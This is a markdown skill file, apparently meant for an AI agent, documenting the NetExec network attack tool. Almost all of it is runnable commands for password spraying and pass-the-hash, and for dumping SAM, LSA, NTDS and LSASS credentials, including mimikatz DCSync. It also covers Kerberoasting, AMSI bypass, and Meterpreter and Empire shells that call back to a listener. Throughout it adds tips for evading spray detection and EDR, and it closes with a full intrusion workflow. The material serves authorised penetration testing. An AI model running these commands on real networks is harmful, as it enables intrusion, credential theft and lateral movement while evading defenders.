# NetExec (nxc) Skill

## Overview

NetExec (nxc) is a network service exploitation tool for assessing large networks. It supports SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS, and VNC protocols.

**Source:** https://www.netexec.wiki/ | **GitHub:** https://github.com/Pennyw0rth/NetExec

---

## Global Syntax & Options

```bash
nxc [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--verbose] [--debug] [--version]
    {smb,ssh,ldap,ftp,wmi,winrm,rdp,vnc,mssql,nfs} ...

# View protocol options
nxc <protocol> --help

# View available modules for a protocol
nxc <protocol> -L
```

---

## Target Formats

```bash
nxc <protocol> hostname.domain.local
nxc <protocol> 192.168.1.0/24
nxc <protocol> 192.168.1.0 192.168.0.2
nxc <protocol> 192.168.1.0-28 10.0.0.1-67
nxc <protocol> ~/targets.txt
```

---

## Authentication

### Credentials
```bash
# Password
nxc <protocol> <target> -u username -p password

# NT hash (pass-the-hash)
nxc <protocol> <target> -u username -H 'NTHASH'
nxc <protocol> <target> -u username -H 'LM:NT'

# Special chars / dashes in creds
nxc <protocol> <target> -u username -p 'October2022!'
nxc <protocol> <target> -u='-username' -p='-October2022'

# From database by credential ID
nxc <protocol> <target> -id <cred_id>

# Multi-domain (FILE format: DOMAIN\user per line)
nxc <protocol> <target> -u FILE -p password
```

### Brute Force & Password Spraying
```bash
# Multiple users/passwords inline
nxc <protocol> <target> -u user1 user2 -p Summer18
nxc <protocol> <target> -u user1 -p pass1 pass2 pass3

# From files
nxc <protocol> <target> -u users.txt -p passwords.txt
nxc <protocol> <target> -u users.txt -H hashes.txt

# No bruteforce (1 user = 1 password, paired)
nxc <protocol> <target> -u users.txt -p passwords.txt --no-bruteforce
nxc <protocol> <target> -u users.txt -H hashes.txt --no-bruteforce

# Continue after success
nxc <protocol> <target> -u users.txt -p 'Summer18' --continue-on-success

# Jitter between requests (seconds or range)
nxc <protocol> <target> --jitter 3 -u users.txt -p passwords.txt
nxc <protocol> <target> --jitter 2-5 -u users.txt -p passwords.txt
```

### Kerberos
```bash
# Kerberos auth with password (auto TGT)
nxc smb zoro.gold.local -u user -p Password -k

# Use existing ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb zoro.gold.local --use-kcache
nxc smb zoro.gold.local --use-kcache -x whoami

# Specify KDC host
nxc ldap dc.domain.local -k --kdcHost dc01.domain.local
```

### Certificates
```bash
nxc smb 192.168.0.1 --pfx-cert user.pfx -u user
nxc smb 192.168.0.1 --pfx-cert user.pfx --pfx-pass password -u user
nxc smb 192.168.0.1 --pfx-base64 user.pfx -u user
nxc smb 192.168.0.1 --pem-cert user.pem --pem-key key.pem -u user
```

### DNS Options
```bash
nxc <protocol> <target> -u user -p pass --dns-server <dns-server-ip>
nxc <protocol> <target> -u user -p pass --dns-timeout <seconds>
nxc <protocol> <target> -u user -p pass --dns-tcp
nxc <protocol> <target> -u user -p pass -6    # Enforce IPv6
```

---

## Modules

```bash
# List modules for a protocol
nxc smb -L

# Run a module
nxc smb <target> -u admin -p pass -M lsassy

# View module options
nxc smb -M lsassy --options

# Module with options (KEY=value)
nxc <protocol> <target> -u admin -p pass -M module -o KEY=value

# Multiple modules at once
nxc smb <target> -u admin -p pass -M spooler -M iis -M lsassy -M winscp
```

---

## Database (nxcdb)

```bash
nxcdb                                    # Enter interactive shell

# Workspaces
workspace create test
workspace default
workspace list

# Protocol databases
proto smb
proto ldap
back

# Export
export shares detailed file.csv
export [creds|hosts|local_admins|shares|signing|keys] [simple|detailed] [filename]
export keys [all|<id>] [filename]

# Help
help
```

---

## Logging

```bash
# Log current command only
nxc <protocol> <target> -u user -p pass --log results.txt

# Log everything (set in ~/.nxc/nxc.conf): log_mode = True
```

---

## SMB Protocol

### Setup Helpers
```bash
# Generate /etc/hosts file for lab (DNS-free environments)
nxc smb <ip> -u user -p pass --generate-hosts-file

# Generate krb5.conf (for use with Kerberos tools)
nxc smb <ip> -u user -p pass --generate-krb5-file /tmp/krb5.conf
export KRB5_CONFIG=/tmp/krb5.conf

# Generate TGT and use it
nxc smb <ip> -u user -p pass --generate-tgt /tmp/ticket.ccache
export KRB5CCNAME=/tmp/ticket.ccache
nxc smb <ip> -u user -k --use-kcache
```

### Vulnerability Scanning
```bash
# Individual checks
nxc smb <ip> -u '' -p '' -M zerologon
nxc smb <ip> -u user -p pass -M nopac           # Requires creds
nxc smb <ip> -u '' -p '' -M printnightmare
nxc smb <ip> -u '' -p '' -M smbghost
nxc smb <ip> -u '' -p '' -M ms17-010
nxc smb <ip> -u user -p pass -M ntlm_reflection  # Requires creds (CVE-2025-33073)

# Stack multiple
nxc smb <ip> -u '' -p '' -M zerologon -M printnightmare -M smbghost

# Coerce vulnerabilities (PetitPotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce)
nxc smb <ip> -u '' -p '' -M coerce_plus
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<attacker-ip>
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<attacker-ip> ALWAYS=true
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam   # or M=pe, M=pr, M=dfs
```

### Enumeration
```bash
# Enumerate hosts / null session / guest logon
nxc smb 192.168.1.0/24
nxc smb 192.168.1.0/24 -u '' -p ''              # Null session
nxc smb 192.168.1.0/24 -u 'guest' -p ''         # Guest logon

# SMB signing
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Shares
nxc smb <ip> -u user -p pass --shares

# Disks
nxc smb <ip> -u user -p pass --disks

# Logged-on users
nxc smb <ip> -u user -p pass --loggedon-users
nxc smb <ip> -u user -p pass --qwinsta           # Interactive sessions only

# Domain users & groups
nxc smb <ip> -u user -p pass --users
nxc smb <ip> -u user -p pass --groups
nxc smb <ip> -u user -p pass --local-groups

# Password policy
nxc smb <ip> -u user -p pass --pass-pol

# RID brute (enumerate users without creds)
nxc smb <ip> -u '' -p '' --rid-brute
nxc smb <ip> -u '' -p '' --rid-brute 10000

# Sessions
nxc smb <ip> -u user -p pass --sessions
```

### Password Spraying
```bash
nxc smb 192.168.1.0/24 -u user1 user2 user3 -p Summer18
nxc smb 192.168.1.0/24 -u users.txt -p Summer18
nxc smb 192.168.1.0/24 -u Administrator -p passwords.txt
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# username == password check
nxc smb 192.168.1.0/24 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

### Authentication
```bash
# Domain auth
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORD'
nxc smb 192.168.1.0/24 -u UserName -H 'NTHASH'
nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'

# Local auth
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORD' --local-auth
nxc smb 192.168.1.0/24 -u '' -p '' --local-auth
nxc smb 192.168.1.0/24 -u UserName -H 'NTHASH' --local-auth
```

### Delegation (RBCD / S4U2Self)
```bash
# RBCD: if msDS-AllowedToActOnBehalfOfOtherIdentity is set to an account you control
# Automatically performs RBCD and impersonates the target user
nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator

# S4U2Self: use a computer account hash to get local admin via S4U2Self extension
nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self
```

### Command Execution
```bash
# Execute cmd command (wmiexec → atexec → smbexec fallback)
nxc smb <ip> -u admin -p pass -x whoami

# Execute PowerShell command
nxc smb <ip> -u admin -p pass -X '$PSVersionTable'

# Force specific exec method
nxc smb <ip> -u admin -p pass -x whoami --exec-method wmiexec
nxc smb <ip> -u admin -p pass -x whoami --exec-method atexec
nxc smb <ip> -u admin -p pass -x whoami --exec-method smbexec

# Bypass AMSI
nxc smb <ip> -u admin -p pass -X 'IEX(...)' --amsi-bypass /path/to/payload
```

### Getting Shells
```bash
# Empire agent
nxc 192.168.10.0/24 -u user -p pass -M empire_exec -o LISTENER=test

# Meterpreter via metinject
nxc 192.168.10.0/24 -u user -p pass -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
```

### Spidering Shares
```bash
# Spider a share by pattern
nxc smb <ip> -u user -p pass --spider C\$ --pattern txt

# Spider all readable shares (list)
nxc smb <ip> -u user -p pass -M spider_plus

# Spider and download all files
nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True
```

### File Transfer
```bash
# Upload file to target
nxc smb <ip> -u user -p pass --put-file /tmp/file.txt '\\Windows\\Temp\\file.txt'

# Download file from target
nxc smb <ip> -u user -p pass --get-file '\\Windows\\Temp\\file.txt' /tmp/file.txt
```

### Credential Dumping

#### SAM
```bash
nxc smb 192.168.1.0/24 -u user -p pass --sam
nxc smb 192.168.1.0/24 -u user -p pass --sam secdump   # Old method
```

#### LSA Secrets
```bash
nxc smb 192.168.1.0/24 -u user -p pass --lsa
nxc smb 192.168.1.0/24 -u user -p pass --lsa secdump
```

#### NTDS.dit (Domain Controller)
```bash
# Default (drsuapi)
nxc smb 192.168.1.100 -u user -p pass --ntds
nxc smb 192.168.1.100 -u user -p pass --ntds --enabled   # Only enabled accounts
nxc smb 192.168.1.100 -u user -p pass --ntds vss         # VSS method

# Specific user
nxc smb 192.168.1.100 -u user -p pass --ntds --user Administrator
nxc smb 192.168.1.100 -u user -p pass --ntds --user NETBIOS/Administrator

# Via ntdsutil module
nxc smb 192.168.1.100 -u user -p pass -M ntdsutil

# Raw disk access
nxc smb 192.168.1.100 -u user -p pass -M ntds-dump-raw -o TARGET=NTDS
```

##### Post-extraction: PtH spray the entire NTDS

`--ntds` writes the dump to `~/.nxc/logs/ntds/<HOST>_<IP>_<TIMESTAMP>.ntds` in `user:rid:LM:NT:::` format. Feeding it back into nxc as paired user+hash lists with `--no-bruteforce` gives a single-pass map of where every domain account has access, plus immediate identification of:

- **Password reuse** — multiple users sharing one NT hash (same line in `--no-bruteforce` cuts across hits)
- **Tier-0 reach** — `(Pwn3d!)` markers from low-privilege identities reveal hidden over-permissioning
- **Cross-forest / local-SAM collisions** — adding `--local-auth` reveals where a domain NT hash also unlocks the local SAM with the same username
- **Validation that the NTDS dump itself is authentic** — every line should authenticate on the DC

```bash
# 1) Extract paired user/hash lists from the latest --ntds dump.
#    Skip disabled accounts and skip machine accounts ($-suffix can't interactive logon).
NTDS=$(ls -t ~/.nxc/logs/ntds/<HOST>_*.ntds | head -1)
grep -vi disabled "$NTDS" | awk -F: '$1 !~ /\$$/ {print $1":"$4}' | sort -u > /tmp/ntds_pairs.txt
cut -d: -f1 /tmp/ntds_pairs.txt > /tmp/ntds_users.txt
cut -d: -f2 /tmp/ntds_pairs.txt > /tmp/ntds_hashes.txt

# 2) Paired PtH spray (domain auth) — every user authenticates with its own NT hash.
nxc smb <subnet-or-targets.txt> \
    -u /tmp/ntds_users.txt -H /tmp/ntds_hashes.txt \
    --no-bruteforce --continue-on-success

# 3) Same spray with --local-auth — surfaces local-SAM accounts that share the name+password.
nxc smb <subnet-or-targets.txt> \
    -u /tmp/ntds_users.txt -H /tmp/ntds_hashes.txt \
    --no-bruteforce --continue-on-success --local-auth

# 4) Filter to the Pwn3d! hits — those are the local-admin breadth map.
nxc smb <subnet-or-targets.txt> \
    -u /tmp/ntds_users.txt -H /tmp/ntds_hashes.txt \
    --no-bruteforce --continue-on-success 2>&1 | grep Pwn3d | sort -u
```

`--no-bruteforce` is critical here: without it, nxc cross-products users × hashes (millions of attempts, account lockouts). Pairing is enforced when both input files have equal line counts and the same order.

For larger dumps, throttle with `--jitter 1-3` and `-t 5` to stay under most spray-detection thresholds.

#### LSASS
```bash
nxc smb <ip> -u admin -p pass -M lsassy
nxc smb <ip> -u admin -p pass -M nanodump
nxc smb <ip> -u admin -p pass -M mimikatz
nxc smb <ip> -u admin -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"'
```

#### DPAPI (browsers, credential manager)
```bash
nxc smb <ip> -u user -p pass --dpapi
nxc smb <ip> -u user -p pass --dpapi cookies       # Include browser cookies
nxc smb <ip> -u user -p pass --dpapi nosystem      # Skip system creds (EDR evasion)
nxc smb <ip> -u user -p pass --local-auth --dpapi nosystem
```

#### Security Questions
```bash
# Dump local user security questions (requires local admin)
nxc smb <ip> -u user -p pass -M security-questions
```

#### Other Credential Sources
```bash
nxc smb <ip> -u user -p pass -M wifi                  # WiFi passwords
nxc smb <ip> -u user -p pass -M keepass               # KeePass
nxc smb <ip> -u user -p pass -M veeam                 # Veeam
nxc smb <ip> -u user -p pass -M winscp                # WinSCP
nxc smb <ip> -u user -p pass -M putty                 # PuTTY
nxc smb <ip> -u user -p pass -M vnc                   # VNC credentials
nxc smb <ip> -u user -p pass -M mremoteng             # mRemoteNG
nxc smb <ip> -u user -p pass -M rdcman                # Remote Desktop Credential Manager
nxc smb <ip> -u user -p pass -M sccm                  # SCCM credentials
nxc smb <ip> -u user -p pass -M token-broker-cache    # Token Broker Cache
```

### LAPS
```bash
nxc smb <ip> -u laps-reader -p pass --laps
nxc smb <ip> -u laps-reader -p pass --laps administrator   # Custom admin name
```

### Spooler & WebDav Detection
```bash
nxc smb <ip> -u user -p pass -M spooler
nxc smb <ip> -u user -p pass -M webdav
```

### Teams Cookies
```bash
nxc smb <ip> -u user -p pass -M teams_localdb
```

### Impersonate Logged-on Users
```bash
# Step 1: Enumerate interactive sessions
nxc smb <ip> -u localadmin -p pass --loggedon-users
nxc smb <ip> -u localadmin -p pass --qwinsta

# Step 2: Execute command as another user
nxc smb <ip> -u localadmin -p pass -M schtask_as -o USER=<target-user> CMD=whoami
nxc smb <ip> -u localadmin -p pass --local-auth -M schtask_as \
    -o USER=<target-user> CMD="whoami" TASK="Windows Update Service" \
    FILE="update.log" LOCATION="\\Windows\\Tasks\\"
```

### Change User Password
```bash
# Change own password
nxc smb <ip> -u user -p pass -M change-password -o NEWPASS=NewPassword
nxc smb <ip> -u user -p pass -M change-password -o NEWNTHASH=<nthash>

# Change another user's password (requires ForceChangePassword or admin)
nxc smb <ip> -u user -p pass -M change-password -o USER=TargetUser NEWPASS=NewPassword
nxc smb <ip> -u user -p pass -M change-password -o USER=TargetUser NEWHASH=<nthash>
```

---

## LDAP Protocol

### Authentication
```bash
nxc ldap 192.168.1.0/24 -u user -p password
nxc ldap 192.168.1.0/24 -u user -H NTHASH
nxc ldap 192.168.1.0/24 -u users.txt -p '' -k    # Test existence via Kerberos
nxc ldap dc.domain.local -u user -p pass --no-smb # Skip initial SMB connection
```

### Enumeration
```bash
# Users
nxc ldap <ip> -u user -p pass --users
nxc ldap <ip> -u user -p pass --users-export output.txt
nxc ldap <ip> -u user -p pass --active-users

# Groups (all groups, or members of a specific group)
nxc ldap <ip> -u user -p pass --groups
nxc ldap <ip> -u user -p pass --groups "Domain Admins"

# Raw LDAP query (filter + space-separated attributes; empty string = all attrs)
nxc ldap <ip> -u user -p pass --query "(sAMAccountName=Administrator)" ""
nxc ldap <ip> -u user -p pass --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"

# Domain SID
nxc ldap <ip> -u user -p pass --get-sid
nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid

# Admin count (privileged accounts with adminCount=1)
nxc ldap <ip> -u user -p pass --admin-count

# Machine Account Quota
nxc ldap <ip> -u user -p pass --maq

# User descriptions (often contain passwords)
nxc ldap <ip> -u user -p pass --user-desc
nxc ldap <ip> -u user -p pass -M get-desc-users

# Subnets
nxc ldap <ip> -u user -p pass --subnets

# Subnet enumeration module
nxc ldap <ip> -u user -p pass -M get-network
nxc ldap <ip> -u user -p pass -M get-network -o ONLY_HOSTS=true
nxc ldap <ip> -u user -p pass -M get-network -o ALL=true

# PSO (Fine-grained Password Settings Objects)
nxc ldap <ip> -u user -p pass --pso

# SCCM
nxc ldap <ip> -u user -p pass -M sccm
nxc ldap <ip> -u user -p pass -M sccm -o REC_RESOLVE=TRUE

# Entra ID (Azure AD)
nxc ldap <ip> -u user -p pass -M entra-id

# DC list + trust enumeration
nxc ldap <ip> -u user -p pass --dc-list
```

### Kerberos Attacks
```bash
# ASREPRoast (no auth required with user list)
nxc ldap <ip> -u users.txt -p '' --asreproast output.txt
nxc ldap <ip> -u user -p pass --asreproast output.txt              # With auth (all vuln users)
nxc ldap <ip> -u user -p pass --asreproast output.txt --kdcHost dc01.domain.local
# Crack: hashcat -m18200 output.txt wordlist

# Kerberoasting
nxc ldap <ip> -u user -p pass --kerberoasting output.txt
# Crack: hashcat -m13100 output.txt wordlist

# Targeted Kerberoasting (sets SPN temporarily, requires write on SPN attr)
nxc ldap <ip> -u user -p pass --kerberoasting output.txt --targeted-kerberoast victim1 victim2
nxc ldap <ip> -u user -p pass --kerberoasting output.txt --targeted-kerberoast users.list

# Kerberoasting via ASREPRoast account (no pre-auth)
nxc ldap <ip> -u asrep_user -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

### Delegation
```bash
# Unconstrained delegation (accounts with TrustedForDelegation)
nxc ldap <ip> -u user -p pass --trusted-for-delegation

# Find ALL misconfigured delegations (unconstrained, constrained, RBCD)
# Shows AccountName, AccountType, DelegationType, DelegationRightsTo
nxc ldap <ip> -u user -p pass --find-delegation
```

### gMSA
```bash
# Dump gMSA password (requires rights, auto-uses LDAPS)
nxc ldap <ip> -u user -p pass --gmsa

# Extract gMSA secrets — convert ID found in LSA to readable form
nxc ldap <ip> -u user -p pass --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724

# Extract gMSA secrets — decrypt full LSA blob
nxc ldap <ip> -u user -p pass --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_<blob>'
```

### Pre-Windows 2000 Accounts
```bash
nxc ldap <ip> -u user -p pass -M pre2k
```

### ADCS / ESC8
```bash
nxc ldap <ip> -u user -p pass -M adcs             # Find ADCS servers
nxc ldap <ip> -u user -p pass -M adcs -o SERVER=<ca-server>  # ESC8 exploit
```

### LDAP Security Checks
```bash
# Check LDAP signing / channel binding
nxc ldap <ip> -u user -p pass -M ldap-checker
```

### DACL / ACL
```bash
# daclread module — read, backup, and analyze DACLs

# Read all ACEs on a principal
nxc ldap <ip> -k --kdcHost dc -M daclread -o TARGET=Administrator ACTION=read

# Read rights a specific principal has on a target
nxc ldap <ip> -k --kdcHost dc -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp

# Find all principals with DCSync rights on the domain
nxc ldap <ip> -k --kdcHost dc -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync

# Show only denied ACEs
nxc ldap <ip> -k --kdcHost dc -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied

# Backup DACLs for multiple targets (targets.txt, one per line)
nxc ldap <ip> -k --kdcHost dc -M daclread -o TARGET=../../targets.txt ACTION=backup
# Module options: TARGET, TARGET_DN, ACTION=(read|backup), PRINCIPAL, RIGHTS, ACE_TYPE=(allowed|denied)
```

### Domain Trusts & DCs
```bash
nxc ldap <ip> -u user -p pass --trusts

# Raisechild (child-to-parent domain trust escalation)
# Abuses SID History + Golden Ticket to escalate from child to parent domain
nxc ldap <child-dc-ip> -u user -p pass -M raisechild -o TARGET=<parent-domain-admin>
nxc ldap <child-dc-ip> -u user -p pass -M raisechild -o USER=Administrator RID=500
# Module options: TARGET (user to escalate), USER, USER_ID, RID, ETYPE
```

### BloodHound Ingestor
```bash
nxc ldap <ip> -u user -p pass --bloodhound --collection All
nxc ldap <ip> -u user -p pass --bloodhound --collection DCOnly
nxc ldap <ip> -u user -p pass --bloodhound --collection Group,LocalAdmin,Session
```

### BloodHound Integration (mark owned)
```bash
# Configure ~/.nxc/nxc.conf:
# [BloodHound]
# bh_enabled = True
# bh_uri = 127.0.0.1
# bh_port = 7687
# bh_user = user
# bh_pass = pass
```

---

## WinRM Protocol

### Password Spraying
```bash
nxc winrm 192.168.1.0/24 -u user -p password
nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --continue-on-success
```

### Command Execution
```bash
nxc winrm <ip> -u user -p pass -X whoami
nxc winrm <ip> -u user -p pass -X '$PSVersionTable'
```

### LAPS
```bash
nxc winrm <ip> -u laps-reader -p pass --laps
```

### Credential Dumping
```bash
# SAM hashes (requires local admin; use --local-auth for local accounts)
nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORD' --sam

# LSA secrets
nxc winrm 192.168.1.0/24 -u UserName -p 'PASSWORD' --lsa

# DPAPI (Credential Manager — no admin required, dumps for connecting user)
nxc winrm <ip> -u user -p password --dpapi

# Module-based dumping
nxc winrm <ip> -u user -p pass -M lsassy
nxc winrm <ip> -u user -p pass -M mimikatz
```

---

## MSSQL Protocol

### Enumeration
```bash
# Host enumeration — shows EncryptionReq status
nxc mssql 192.168.56.0/24

# Check channel binding (determines if NTLM relay is possible)
nxc mssql <ip> -u user -p pass -M mssql_cbt
# If output is NOT "Channel Binding Token REQUIRED" → relay is possible
```

### Password Spraying
```bash
nxc mssql 192.168.1.0/24 -u user -p password
nxc mssql 192.168.1.0/24 -u users.txt -p passwords.txt
nxc mssql 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

### Authentication
```bash
nxc mssql <ip> -u user -p password
nxc mssql <ip> -u user -p password --local-auth    # SQL local auth
nxc mssql <ip> -u sa -p password --local-auth
```

### MSSQL Queries
```bash
nxc mssql <ip> -u admin -p pass --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

### Command Execution (xp_cmdshell)
```bash
nxc mssql <ip> -u sa -p pass --local-auth -x whoami
```

### Privilege Escalation
```bash
# Check impersonation
nxc mssql <ip> -u user -p pass -M mssql_priv

# Escalate to sysadmin
nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=privesc

# Rollback (important in production!)
nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=rollback
```

### Upload & Download
```bash
nxc mssql <ip> -u user -p pass --put-file /local/file.txt C:\\remote\\file.txt
nxc mssql <ip> -u user -p pass --get-file C:\\remote\\file.txt /local/file.txt
```

### Linked Servers
```bash
# Enumerate linked servers
nxc mssql <ip> -u user -p pass -M enum_links

# Query on linked server
nxc mssql <ip> -u user -p pass -M exec_on_link -o LINKED_SERVER=BRAAVOS COMMAND='select @@servername'

# Enable xp_cmdshell on linked server
nxc mssql <ip> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=enable

# Execute command on linked server
nxc mssql <ip> -u user -p pass -M link_xpcmd -o LINKED_SERVER=BRAAVOS CMD='whoami'

# Disable xp_cmdshell (cleanup)
nxc mssql <ip> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=BRAAVOS ACTION=disable
```

### RID Brute (enumerate users)
```bash
nxc mssql <ip> -u user -p pass --rid-brute
```

---

## SSH Protocol

### Password Spraying
```bash
nxc ssh 192.168.1.0/24 -u user -p password
nxc ssh 192.168.1.0/24 -u users.txt -p passwords.txt
```

### Authentication
```bash
nxc ssh <ip> -u user -p password
nxc ssh <ip> -u user --key-file /path/to/key
```

### Command Execution
```bash
nxc ssh <ip> -u user -p pass -x whoami
```

### File Transfer
```bash
nxc ssh <ip> -u user -p pass --put-file /local/file /remote/path
nxc ssh <ip> -u user -p pass --get-file /remote/file /local/path
```

---

## FTP Protocol

### Password Spraying
```bash
nxc ftp 192.168.1.0/24 -u user -p password
nxc ftp 192.168.1.0/24 -u users.txt -p passwords.txt
```

### File Listing
```bash
nxc ftp <ip> -u user -p pass --ls
nxc ftp <ip> -u user -p pass --ls /path
```

### File Transfer
```bash
nxc ftp <ip> -u user -p pass --put-file /local/file /remote/file
nxc ftp <ip> -u user -p pass --get-file /remote/file /local/file
```

---

## RDP Protocol

### Password Spraying
```bash
nxc rdp 192.168.1.0/24 -u user -p password
nxc rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
nxc rdp 192.168.1.0/24 -u users.txt -p 'Summer18' --continue-on-success
```

### Screenshots
```bash
# Screenshot (authenticated, connected session)
nxc rdp <ip> -u user -p pass --screenshot --screentime <seconds>

# Screenshot without NLA (no credentials needed, shows login screen)
nxc rdp <ip> --nla-screenshot
```

### Command Execution
```bash
# Execute command via RDP (beta — disconnects/locks active session, no logoff)
nxc rdp <ip> -u user -p pass -x whoami

# Add delays for slow targets
nxc rdp <ip> -u user -p pass -x whoami --cmd-delay 2 --clipboard-delay 1
```

---

## WMI Protocol

### Password Spraying
```bash
nxc wmi 192.168.1.0/24 -u user -p password
nxc wmi 192.168.1.0/24 -u users.txt -p passwords.txt
```

### Authentication Check
```bash
nxc wmi <ip> -u user -p password
nxc wmi <ip> -u user -H NTHASH
```

### Command Execution
```bash
nxc wmi <ip> -u user -p pass -x whoami
```

---

## NFS Protocol

### Enumeration
```bash
# Detect NFS, versions, root escape status
nxc nfs <ip>

# Enumerate exported shares
nxc nfs <ip> --shares

# List files in a share
nxc nfs <ip> --share '/var/nfs/general' --ls '/'

# Recursively enumerate all files (default depth 3)
nxc nfs <ip> --enum-shares

# Custom depth
nxc nfs <ip> --enum-shares 5
```

### File Operations
```bash
nxc nfs <ip> --share '/path/to/share' --get-file /remote/file.txt /local/file.txt
nxc nfs <ip> --share '/path/to/share' --put-file /local/file.txt /remote/file.txt
```

### Root File System Escape
```bash
# Check if root escape is possible (shown in enumeration output)
nxc nfs <ip>

# Mount root FS via escape (if root_escape:True)
nxc nfs <ip> --share '/' --ls '/'
```

---

## VNC Protocol

### Authentication
```bash
nxc vnc <ip> -u user -p password
nxc vnc 192.168.1.0/24 -u user -p password
```

---

## Configuration (~/.nxc/nxc.conf)

### Audit Mode
```ini
# Redact credentials from console output (replace with chosen char)
[nxc]
audit_mode = *
# Leave blank to disable audit mode
```

### BloodHound Integration
```ini
# Auto-mark compromised accounts as "owned" in BloodHound
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
```

### Ignore OpSec Warnings
```ini
[nxc]
ignore_opsec = True
# Not recommended — you should want to know when nxc is performing noisy actions
```

---

## OPSEC Notes

- `--no-bruteforce` with `--continue-on-success` is safest for spraying
- `--jitter` randomizes delays to avoid lockout detection
- Execution method order: wmiexec → atexec → smbexec; use `--exec-method` to force
- `--dpapi nosystem` avoids touching system credentials that trigger EDR
- LAPS reader account is required for `--laps`; doesn't expose the password in logs when audit mode is enabled
- `nxc smb --generate-hosts-file` avoids DNS queries in LDAP/Kerberos ops
- Kerberos requires hostname resolution; use `--kdcHost` when DNS fails
- Certificate auth generates a ccache file reusable by other tools
- Set `audit_mode = *` in `~/.nxc/nxc.conf` to redact creds from console output

---

## Quick Reference — Common Engagement Workflow

```bash
# 1. Discover hosts
nxc smb 192.168.1.0/24

# 2. Null session / guest enum
nxc smb 192.168.1.0/24 -u '' -p '' --shares
nxc smb 192.168.1.0/24 -u guest -p '' --shares

# 3. Spray credentials
nxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success

# 4. Check for vulns
nxc smb 192.168.1.0/24 -u user -p pass -M zerologon -M nopac -M coerce_plus

# 5. Enumerate domain
nxc ldap dc.domain.local -u user -p pass --users --groups --bloodhound --collection All

# 6. Kerberos attacks
nxc ldap dc.domain.local -u user -p pass --asreproast asrep.txt
nxc ldap dc.domain.local -u user -p pass --kerberoasting kerb.txt

# 7. Dump credentials (if admin)
nxc smb <ip> -u admin -p pass --sam
nxc smb <ip> -u admin -p pass --lsa
nxc smb dc.domain.local -u admin -p pass --ntds
nxc smb <ip> -u admin -p pass -M lsassy
nxc smb <ip> -u admin -p pass --dpapi nosystem

# 8. Lateral movement
nxc winrm <ip> -u admin -p pass -X whoami
nxc wmi <ip> -u admin -p pass -x whoami
nxc smb <ip> -u admin -p pass -x whoami --exec-method wmiexec
```
